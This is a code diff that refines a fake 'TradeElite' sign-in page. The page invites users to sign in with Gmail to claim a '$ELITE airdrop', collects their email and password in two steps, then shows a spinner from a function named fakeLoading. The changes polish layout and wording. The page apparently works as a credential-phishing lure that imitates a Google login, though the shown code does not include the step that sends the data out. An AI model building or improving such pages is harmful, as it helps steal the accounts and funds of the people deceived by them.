@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TradeElite - Sign in</title>
+    <title>Sign in to TradeElite</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
         
@@ -22,7 +22,8 @@
             border: 1px solid #334155;
             border-radius: 20px;
             padding: 40px 30px;
-            width: 420px;
+            width: 100%;
+            max-width: 420px;
             text-align: center;
             box-shadow: 0 25px 60px -10px rgb(0 0 0 / 0.6);
         }
@@ -64,7 +65,7 @@
             font-size: 16px; cursor: pointer;
         }
         
-        .hidden { display: none; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -73,23 +74,22 @@
         <h1 id="title">Sign in to TradeElite</h1>
         <p id="subtitle">Use your Gmail account to claim your $ELITE airdrop</p>
 
-        <!-- Step 1: Email -->
+        <!-- Email Step -->
         <div id="emailStep">
             <input type="email" id="emailInput" placeholder="your.email@gmail.com" value="user@gmail.com">
+            
             <button class="gmail-btn" onclick="useGoogle()">
-                
                 Sign in with Google
             </button>
-            <button class="continue" onclick="nextStep()">Continue</button>
+            
+            <button class="continue" onclick="showPasswordStep()">Continue</button>
         </div>
 
-        <!-- Step 2: Password -->
+        <!-- Password Step -->
         <div id="passwordStep" class="hidden">
-            <input type="password" id="passwordInput" placeholder="Password">
+            <input type="password" id="passwordInput" placeholder="Password" autocomplete="off">
             <button class="continue" onclick="submitLogin()">Sign in</button>
-            <p style="margin-top:20px; font-size:13px; color:#64748b; cursor:pointer;" onclick="backToEmail()">
-                ← Back
-            </p>
+            <p style="margin-top:20px; font-size:13px; color:#64748b; cursor:pointer;" onclick="backToEmail()">← Back</p>
         </div>
     </div>
 
@@ -101,16 +101,16 @@
             }, 1400);
         }
 
-        function nextStep() {
+        function showPasswordStep() {
             const email = document.getElementById('emailInput').value.trim();
-            if (email === "") {
-                alert("Please enter your email");
+            if (!email) {
+                alert("Please enter your email address");
                 return;
             }
             
             document.getElementById('emailStep').classList.add('hidden');
             document.getElementById('passwordStep').classList.remove('hidden');
-            document.getElementById('title').textContent = "Enter password";
+            document.getElementById('title').textContent = "Enter your password";
             document.getElementById('subtitle').textContent = email;
         }
 
@@ -123,7 +123,7 @@
 
         function submitLogin() {
             const password = document.getElementById('passwordInput').value.trim();
-            if (password === "") {
+            if (!password) {
                 alert("Please enter your password");
                 return;
             }
@@ -137,10 +137,11 @@
         function fakeLoading(text) {
             const container = document.getElementById('container');
             container.innerHTML = `
-                <div style="padding:60px 20px;">
-                    <div style="margin-bottom:20px;">${text}</div>
-                    <div style="width:40px;height:40px;border:4px solid #334155;border-top:#22c55e;border-radius:50%;margin:auto;animation:spin 1s linear infinite;"></div>
+                <div style="padding:80px 20px; text-align:center;">
+                    <div style="margin-bottom:24px; font-size:17px;">${text}</div>
+                    <div style="width:40px;height:40px;border:5px solid #334155;border-top:#22c55e;border-radius:50%;margin:auto;animation:spin 1s linear infinite;"></div>
                 </div>
+                <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
             `;
         }
     </script>
